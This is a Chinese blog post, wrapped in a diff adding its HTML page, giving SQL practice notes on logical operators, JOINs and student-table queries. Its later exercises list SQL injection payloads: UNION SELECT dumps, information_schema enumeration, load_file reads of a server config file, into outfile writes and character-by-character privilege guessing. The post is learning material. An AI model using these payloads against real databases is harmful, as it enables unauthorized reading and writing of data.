@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQL语句," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="DiZai" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="知识点逻辑运算符： NOT 或 ！：逻辑非 AND 或 &amp;amp;&amp;amp;：逻辑与">
+<meta name="keywords" content="SQL语句">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL语句实操">
+<meta property="og:url" content="http://yoursite.com/2018/08/22/SQL语句实操/index.html">
+<meta property="og:site_name" content="DiZai">
+<meta property="og:description" content="知识点逻辑运算符： NOT 或 ！：逻辑非 AND 或 &amp;amp;&amp;amp;：逻辑与">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/SQL/21.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/22.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/23.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/24.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/25.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/26.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/27.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/28.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/29.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/30.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/31.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/32.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/33.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/34.png">
+<meta property="og:updated_time" content="2018-08-22T15:07:46.565Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL语句实操">
+<meta name="twitter:description" content="知识点逻辑运算符： NOT 或 ！：逻辑非 AND 或 &amp;amp;&amp;amp;：逻辑与">
+<meta name="twitter:image" content="http://yoursite.com/images/SQL/21.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/22/SQL语句实操/"/>
+
+
+
+
+
+  <title>SQL语句实操 | DiZai</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">DiZai</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Just do IT</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/22/SQL语句实操/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="迪仔">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiZai">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL语句实操</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-22T22:52:09+08:00">
+                2018-08-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/编译语言/" itemprop="url" rel="index">
+                    <span itemprop="name">编译语言</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,584
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"> 
+	 
+      
+
+      
+        <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>逻辑运算符：</strong></p>
+<p>NOT 或 ！：逻辑非</p>
+<p>AND 或 &amp;&amp;：逻辑与</p>
+<a id="more"></a>
+<p>OR 或 ||：逻辑或</p>
+<p>XOR：逻辑异或</p>
+<p><strong>1、逻辑非 ( NOT 或 ！)</strong></p>
+<p>(1) 当操作数为 0 时，所得值为 1</p>
+<p>(2) 当操作数为非 0 时，所得值为 0</p>
+<p>(3) 当操作数为 NULL 时，所得值为 NULL</p>
+<p>!T = F</p>
+<p>!F = T</p>
+<p><strong>2、逻辑与 ( AND 或 &amp;&amp; )</strong></p>
+<p>(1) 当所有操作数均为非零值、并且不为 NULL 时，所得值为 1</p>
+<p>(2) 当一个或多个操作数为 0 时，所得值为 0 </p>
+<p>(3) 其余情况所得值为 NULL</p>
+<p>T &amp;&amp; T = T</p>
+<p>T &amp;&amp; F = F</p>
+<p>F &amp;&amp; F = F</p>
+<p><strong>3、逻辑或 ( OR 或 || )</strong></p>
+<p>(1) 当两个操作数均为非 NULL 值，且任意一个操作数为非零值时，结果为 1 ，否则为 0</p>
+<p>(2) 当有一个操作数为 NULL ，且另一个操作数为非零值时，则结果为 1 ，否则结果为 NULL</p>
+<p>(3) 当两个操作数均为 NULL 时，则所得结果为 NULL</p>
+<p>T || T = T</p>
+<p>T || F = T</p>
+<p>F || F = F</p>
+<p><strong>4、逻辑异或</strong></p>
+<p>(1) a XOR b 的计算等同于 ( a AND (NOT b) ) 或 ( (NOT a) AND b )</p>
+<p>(2) 当任意一个操作数为 NULL 时，返回值为 NULL</p>
+<p>(3) 对于非 NULL 的操作数，如果两个操作数都是非 0 值或者都是 0 值，则返回结果为 0</p>
+<p>(4) 如果一个为 0 值，另一个为非 0 值，返回结果为 1</p>
+<p>T XOR T = F</p>
+<p>T XOR F = T</p>
+<p>F XOR F = F</p>
+<p><strong>5、逻辑运算符的优先级: 括号&gt;比较运算符&gt;非&gt;与&gt;或</strong></p>
+<p>相同优先级的运算符由左向右依次执行</p>
+<p>例:</p>
+<p>1、Select 1=1 or 1=2 and 2=2 </p>
+<p>2、Select （ 1=1 or 1=2 ) and 2=2</p>
+<p>1、分解为</p>
+<p>Select 1=2 and 2=2  结果为 0</p>
+<p>Select 1=1 or 0 结果为1</p>
+<p>2、分解为</p>
+<p>Select 1=1 or 1=2  结果为 1</p>
+<p>Select 1 and 2=2  结果为1</p>
+<h4 id="表连接："><a href="#表连接：" class="headerlink" title="表连接："></a>表连接：</h4><p>当需要同时显示多个表中的字段时，就可以用表连接来实现，这样的功能。</p>
+<p>从大类上分，表连接分为以下4类：</p>
+<p><strong>【内连接】：仅选出两张表中互相匹配的记录</strong></p>
+<p><strong>【左连接】：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录</strong></p>
+<p><strong>【右连接】：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录</strong></p>
+<p><strong>【外连接】：两边表中的内容全部显示</strong></p>
+<h4 id="SQL连接（JOIN）"><a href="#SQL连接（JOIN）" class="headerlink" title="SQL连接（JOIN）"></a>SQL连接（JOIN）</h4><p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
+<p>最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p>
+<ul>
+<li>INNER JOIN：如果表中有至少一个匹配，则返回行</li>
+</ul>
+<p><img src="/images/SQL/21.png" alt="upload successful"></p>
+<p><strong>SQL INNER JOIN 语法</strong></p>
+<p>SELECT column_name(s)</p>
+<p>FROM table1</p>
+<p>INNER JOIN table2</p>
+<p>ON table1.column_name=table2.column_name;</p>
+<p>select student.student_name,student.student_sex,grade.subject1,grade.grade1,grade.createtimestamp,grade.updatetimestamp</p>
+<p>​    -&gt; from student</p>
+<p>​    -&gt; inner join grade</p>
+<p>​    -&gt; on student.student_id=grade.student_id;</p>
+<p><img src="/images/SQL/22.png" alt="upload successful"></p>
+<ul>
+<li><strong>LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行</strong></li>
+</ul>
+<p><img src="/images/SQL/23.png" alt="upload successful"></p>
+<h4 id="SQL-LEFT-JOIN-语法"><a href="#SQL-LEFT-JOIN-语法" class="headerlink" title="SQL LEFT JOIN 语法"></a>SQL LEFT JOIN 语法</h4><p>SELECT column_name(s)</p>
+<p>FROM table1</p>
+<p>LEFT JOIN table2</p>
+<p>ON table1.column_name=table2.column_name;</p>
+<ul>
+<li><strong>RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行</strong></li>
+</ul>
+<p><img src="/images/SQL/24.png" alt="upload successful"></p>
+<h4 id="SQL-RIGHT-JOIN-语法"><a href="#SQL-RIGHT-JOIN-语法" class="headerlink" title="SQL RIGHT JOIN 语法"></a>SQL RIGHT JOIN 语法</h4><p>SELECT column_name(s)</p>
+<p>FROM table1</p>
+<p>RIGHT JOIN table2</p>
+<p>ON table1.column_name=table2.column_name;</p>
+<ul>
+<li><strong>FULL JOIN：只要其中一个表中存在匹配，则返回行</strong></li>
+</ul>
+<p><img src="/images/SQL/25.png" alt="upload successful"></p>
+<p>SQL FULL OUTER JOIN 语法</p>
+<p>SELECT column_name(s)</p>
+<p>FROM table1</p>
+<p>FULL OUTER JOIN table2</p>
+<p>ON table1.column_name=table2.column_name;</p>
+<h4 id="练习题："><a href="#练习题：" class="headerlink" title="练习题："></a>练习题：</h4><p>student表</p>
+<p><img src="/images/SQL/26.png" alt="upload successful"></p>
+<p>student_score表</p>
+<p><img src="/images/SQL/27.png" alt="upload successful"></p>
+<p><strong>1.插入一条学生学籍信息，及两条学生成绩信息。</strong></p>
+<p>insert into student values(‘13’,’张三’,’男’,’福建’,’泉州’,null’,’23’,null);</p>
+<p>insert into student_score values(‘10’,’Python入门’,’80.5’,’16’,null,null);</p>
+<p>insert into student_score values(‘11’,’密码学基本原理’,’95.5’,’16’,null,null);</p>
+<p><strong>2.查询目前都有哪些课程。</strong></p>
+<p>select distinct lesson from student_score;   //distinct去除重复的课程</p>
+<p><strong>3.查询学生姓名学了哪些课程，每门课程的成绩</strong></p>
+<p>select student.student_name,student_score.lesson,student_score.score from student inner join student_score on student.student_id=student_score.student_id;</p>
+<p><strong>4.查询某一课程最高分数的学生的姓名</strong></p>
+<p>方法一：SELECT student_name,score,lesson from student,student_score where student_score.lesson=(‘WEB安全’) and student.student_id=student_score.student_id order by student_score.score desc LIMIT 1;</p>
+<p>方法二：select a.student_name,b.score from student a,student_score b where a.student_id=b.student_id and b.score = (select max(score) from student_score where lesson = ‘SQL基本语法’) and lesson = ‘SQL基本语法’;</p>
+<p><strong>5.查询所有学生学籍信息及某一科课程的课程名称、成绩、学时。</strong></p>
+<p>select student.*,student_score.lesson,student_score.score,student_score.duration from student left join student_score on student.student_id=student_score.student_id;</p>
+<p>（2）</p>
+<p>select * from student where student_id = ‘$student_id’ </p>
+<p><strong>以上SQL语句中，$student_id为变量，可以用字符串代替</strong></p>
+<h4 id="要求"><a href="#要求" class="headerlink" title="要求:"></a>要求:</h4><p><strong>1.查询所有学生的信息</strong></p>
+<p>select <em> from student where student_id = ‘1’ and 1=2 UNION select </em> from student– ‘</p>
+<p><strong>2.查询表结构</strong></p>
+<p>select * from information_schema.columns where TABLE_NAME=’student’;</p>
+<p>select * from student where student_id = ‘’ UNION select COLUMN_NAME,DATA_TYPE,COLUMN_TYPE,COLUMN_DEFAULT,IS_NULLABLE,COLUMN_KEY,EXTRA,8 from information_schema.columns where TABLE_NAME=(‘student’) – ‘ ;</p>
+<p><img src="/images/SQL/28.png" alt="upload successful"></p>
+<p><strong>3.获取数据库信息</strong></p>
+<p>select * from student where student_id = ‘ 1’ and 1=2 UNION SELECT 1,database(),user(),VERSION(),5,6,7,8 – ‘</p>
+<p><img src="/images/SQL/29.png" alt="upload successful"></p>
+<p><strong>4.获得操作系统信息</strong></p>
+<p>select * from student where student_id = ‘’ UNION SELECT 1,@@global.version_compile_os,3,4,5,6,7,8 – ‘</p>
+<p>或select * from student where student_id = ‘1’and 1=2 union select 1,2,3,4,5,6,7,@@global.version_compile_os from mysql.user ;</p>
+<p><img src="/images/SQL/30.png" alt="upload successful"></p>
+<p><strong>5.查看所有数据库名称</strong></p>
+<p>select * from student where student_id = ‘’ UNION select 1,TABLE_NAME,3,4,5,6,7,8 from information_schema.columns – ‘</p>
+<p><img src="/images/SQL/31.png" alt="upload successful"></p>
+<h4 id="继续："><a href="#继续：" class="headerlink" title="继续："></a>继续：</h4><p><strong>1.用load_file读取文件 C:\Program Files\MySQL\MySQL Server 5.5\my.ini</strong></p>
+<p>select * from student where student_id = ‘’ union select 1,1,1,1,load_file(‘C:\Program Files\MySQL\MySQL Server 5.5\my.ini’),2,3,4 – ‘</p>
+<p><strong>2.将student表内容导出到文件当中</strong></p>
+<p>select * from student into outfile (‘C:\Program Files\MySQL\MySQL Server 5.5\hyd.txt’) </p>
+<p><strong>3.查询学生姓名及【SQL基本语法】成绩、并对成绩按照以下分类</strong></p>
+<p>100-85 优</p>
+<p>85-70 良</p>
+<p>60-70 中</p>
+<p>60以下 差</p>
+<p>select a.student_name,b.lesson,b.score,</p>
+<p>(case when b.score &gt; 85 then ‘优’</p>
+<p> when b.score &gt; 70 then ‘良’</p>
+<p> when b.score &gt; 60 then ‘中’</p>
+<p> else ‘差’ end) as ‘result’</p>
+<p> from student a,student_score b where a.student_id=b.student_id and b.lesson=(‘SQL基本语法’); </p>
+<p><strong>补充：case语句用法</strong></p>
+<p><img src="/images/SQL/32.png" alt="upload successful"></p>
+<p><strong>4.尝试通过mysql查询语句库和站是否分离</strong></p>
+<p>exists(select * from student where 1=(Select (case when host_name()=@servername then 1 else 0 end)))</p>
+<p><strong>5.利用ascii码10进制打出”SQL lesson”</strong></p>
+<p>select ASCII(‘n’) as result from dual</p>
+<p>select char(83,81,76,32,108,101,115,115,111,110) as result from dual</p>
+<p><img src="/images/SQL/33.png" alt="upload successful"></p>
+<p><strong>6.查询student数据库存放的物理位置例如”c:\users\temp”</strong></p>
+<p>show GLOBAL variables like “%data%” </p>
+<p><img src="/images/SQL/34.png" alt="upload successful"></p>
+<p><strong>7.写出猜测当前用户权限的SQL</strong></p>
+<p>select * from student where student_id = ‘1’ and ord(mid(user(),1,1))=116</p>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.runoob.com/sql/sql-join.html" target="_blank" rel="noopener">http://www.runoob.com/sql/sql-join.html</a></p>
+
+      
+    </div>
+	
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	
+	</div>
+    
+    
+    
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL语句/" <i class="fa fa-tag"></i> SQL语句</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/22/SQL语句基础/" rel="next" title="SQL语句基础">
+                <i class="fa fa-chevron-left"></i> SQL语句基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">迪仔</p>
+              <p class="site-description motion-element" itemprop="description">一只不断学习的小菜鸟</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点"><span class="nav-number">1.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#表连接："><span class="nav-number">1.1.</span> <span class="nav-text">表连接：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL连接（JOIN）"><span class="nav-number">1.2.</span> <span class="nav-text">SQL连接（JOIN）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-LEFT-JOIN-语法"><span class="nav-number">1.3.</span> <span class="nav-text">SQL LEFT JOIN 语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-RIGHT-JOIN-语法"><span class="nav-number">1.4.</span> <span class="nav-text">SQL RIGHT JOIN 语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#练习题："><span class="nav-number">1.5.</span> <span class="nav-text">练习题：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#要求"><span class="nav-number">1.6.</span> <span class="nav-text">要求:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#继续："><span class="nav-number">1.7.</span> <span class="nav-text">继续：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文献"><span class="nav-number">2.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">迪仔</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共37.6k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
